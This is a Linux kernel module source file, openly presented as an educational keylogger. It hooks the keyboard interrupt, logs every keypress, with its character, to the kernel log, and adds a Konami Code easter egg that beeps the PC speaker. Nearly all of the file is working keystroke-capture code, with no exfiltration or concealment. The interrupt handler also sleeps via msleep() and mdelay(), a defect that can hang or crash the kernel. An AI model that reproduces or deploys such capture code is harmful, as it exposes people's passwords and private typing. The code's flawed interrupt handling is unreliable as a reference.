/*
 * BAW KeyLogger - Linux Kernel Module
 * 
 * This is a simple Linux kernel module that demonstrates basic keylogging
 * functionality by intercepting keyboard interrupts and logging keystrokes.
 * 
 * Features:
 * - Logs all keyboard input to kernel log (dmesg)
 * - Detects Konami Code sequence (Up, Up, Down, Down, Left, Right, Left, Right, B, A)
 * - Plays a melody when Konami Code is detected
 * 
 * Author: BAW Project
 * License: GPL
 */

#include <linux/module.h>       // Core header for loading LKMs into the kernel
#include <linux/kernel.h>       // Contains types, macros, functions for the kernel
#include <linux/init.h>         // Macros used to mark up functions e.g. __init __exit
#include <linux/interrupt.h>    // Required for interrupt handling
#include <linux/keyboard.h>     // Keyboard notification chain
#include <linux/input.h>        // Input subsystem definitions
#include <linux/timer.h>        // Timer functionality for beeper
#include <linux/kmod.h>         // For call_usermodehelper
#include <asm/io.h>             // For inb/outb functions (beeper control)

// Module information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("BAW Project Team");
MODULE_DESCRIPTION("Educational keylogger with Konami Code easter egg");
MODULE_VERSION("1.0");

// Keyboard IRQ number (typically IRQ 1 for PS/2 keyboard)
#define KEYBOARD_IRQ 1

// PC Speaker (beeper) I/O ports
#define SPEAKER_PORT 0x61
#define TIMER_PORT 0x43
#define TIMER_DATA_PORT 0x42

// Konami Code sequence: Up, Up, Down, Down, Left, Right, Left, Right, B, A
// Using scan codes for these keys
static int konami_sequence[] = {72, 72, 80, 80, 75, 77, 75, 77, 48, 30}; // Scan codes
static int konami_index = 0;  // Current position in Konami sequence
static int konami_length = sizeof(konami_sequence) / sizeof(konami_sequence[0]);

/*
 * Key mapping table for common scan codes to readable characters
 * This is a simplified mapping for demonstration purposes
 */
static char key_map[128] = {
    0,  27, '1', '2', '3', '4', '5', '6', '7', '8',    // 0-9
    '9', '0', '-', '=', '\b',                          // 10-14
    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', // 15-28
    0,    // 29 - Control
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', // 30-39
    '\'', '`', 0,                                      // 40-42
    '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, // 43-53
    '*',
    0,   // Alt
    ' ', // Space bar
    0,   // Caps lock
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, // F1-F10
    0,   // Num lock
    0,   // Scroll Lock
    0,   // Home key
    0,   // Up Arrow
    0,   // Page Up
    '-',
    0,   // Left Arrow
    0,
    0,   // Right arrow
    '+',
    0,   // End key
    0,   // Down Arrow
    0,   // Page Down
    0,   // Insert Key
    0,   // Delete Key
    0, 0, 0,
    0,   // F11 Key
    0,   // F12 Key
    0,   // All other keys are undefined
};

/*
 * Function to play a simple beep using the PC speaker
 * frequency: frequency in Hz
 * duration: duration in milliseconds
 */
static void beep(unsigned int frequency, unsigned int duration)
{
    unsigned int count;
    unsigned char tmp;
    
    if (frequency == 0) {
        // Turn off speaker
        tmp = inb(SPEAKER_PORT);
        outb(tmp & 0xFC, SPEAKER_PORT);
        return;
    }
    
    // Calculate timer count for frequency
    count = 1193180 / frequency;
    
    // Configure timer
    outb(0xB6, TIMER_PORT);
    outb(count & 0xFF, TIMER_DATA_PORT);
    outb((count >> 8) & 0xFF, TIMER_DATA_PORT);
    
    // Turn on speaker
    tmp = inb(SPEAKER_PORT);
    outb(tmp | 0x03, SPEAKER_PORT);
    
    // Simple delay (not precise, for demonstration only)
    mdelay(duration);
    
    // Turn off speaker
    tmp = inb(SPEAKER_PORT);
    outb(tmp & 0xFC, SPEAKER_PORT);
}

/*
 * Play the Konami Code success melody
 * This plays a simple ascending tone sequence
 */
static void play_konami_melody(void)
{
    printk(KERN_INFO "KeyLogger: 🎵 KONAMI CODE ACTIVATED! Playing victory melody! 🎵\n");
    
    // Play a simple melody: C, E, G, C (higher octave)
    beep(523, 200);  // C5
    msleep(50);
    beep(659, 200);  // E5
    msleep(50);
    beep(784, 200);  // G5
    msleep(50);
    beep(1047, 400); // C6
    msleep(100);
    
    printk(KERN_INFO "KeyLogger: Konami Code melody completed!\n");
}

/*
 * Check if the current keystroke continues or completes the Konami sequence
 * scan_code: the scan code of the pressed key
 */
static void check_konami_code(unsigned char scan_code)
{
    // Check if this key matches the next expected key in sequence
    if (scan_code == konami_sequence[konami_index]) {
        konami_index++;
        printk(KERN_INFO "KeyLogger: Konami progress: %d/%d\n", konami_index, konami_length);
        
        // Check if we completed the sequence
        if (konami_index >= konami_length) {
            printk(KERN_ALERT "KeyLogger: 🎉 KONAMI CODE DETECTED! 🎉\n");
            play_konami_melody();
            konami_index = 0; // Reset for next attempt
        }
    } else {
        // Wrong key, reset sequence (but check if this key starts a new sequence)
        konami_index = (scan_code == konami_sequence[0]) ? 1 : 0;
    }
}

/*
 * Keyboard interrupt handler
 * This function is called every time a key is pressed or released
 * irq: interrupt request number
 * dev_id: device identifier
 */
static irqreturn_t keyboard_irq_handler(int irq, void *dev_id)
{
    unsigned char scan_code;
    char key_char;
    
    // Read the scan code from keyboard controller
    scan_code = inb(0x60);
    
    // We only care about key press events (bit 7 = 0 means key press)
    if (!(scan_code & 0x80)) {
        // Convert scan code to character (if possible)
        if (scan_code < 128) {
            key_char = key_map[scan_code];
            
            // Log the keystroke
            if (key_char != 0) {
                printk(KERN_INFO "KeyLogger: Key pressed: '%c' (scan code: 0x%02x)\n", 
                       key_char, scan_code);
            } else {
                printk(KERN_INFO "KeyLogger: Special key pressed (scan code: 0x%02x)\n", 
                       scan_code);
            }
            
            // Check for Konami Code sequence
            check_konami_code(scan_code);
        }
    }
    
    // Return IRQ_NONE to allow other handlers to process this interrupt
    // In a real keylogger, you might want to return IRQ_HANDLED to prevent
    // normal keyboard processing, but that would break the system
    return IRQ_NONE;
}

/*
 * Module initialization function
 * Called when the module is loaded into the kernel
 */
static int __init keylogger_init(void)
{
    int result;
    
    printk(KERN_INFO "KeyLogger: Initializing BAW KeyLogger module...\n");
    printk(KERN_INFO "KeyLogger: This is for educational purposes only!\n");
    
    // Request the keyboard interrupt
    result = request_irq(KEYBOARD_IRQ,           // IRQ number
                        keyboard_irq_handler,    // Handler function
                        IRQF_SHARED,            // Flags (shared interrupt)
                        "baw_keylogger",        // Device name
                        (void *)keyboard_irq_handler); // Device ID
    
    if (result) {
        printk(KERN_ERR "KeyLogger: Failed to register IRQ %d, error: %d\n", 
               KEYBOARD_IRQ, result);
        return result;
    }
    
    printk(KERN_INFO "KeyLogger: Successfully registered keyboard interrupt handler\n");
    printk(KERN_INFO "KeyLogger: Monitoring for Konami Code: ↑↑↓↓←→←→BA\n");
    printk(KERN_INFO "KeyLogger: Module loaded successfully!\n");
    
    return 0; // Success
}

/*
 * Module cleanup function
 * Called when the module is removed from the kernel
 */
static void __exit keylogger_exit(void)
{
    printk(KERN_INFO "KeyLogger: Cleaning up BAW KeyLogger module...\n");
    
    // Free the interrupt
    free_irq(KEYBOARD_IRQ, (void *)keyboard_irq_handler);
    
    printk(KERN_INFO "KeyLogger: Keyboard interrupt handler unregistered\n");
    printk(KERN_INFO "KeyLogger: Module unloaded successfully!\n");
}

// Register module entry and exit points
module_init(keylogger_init);
module_exit(keylogger_exit);
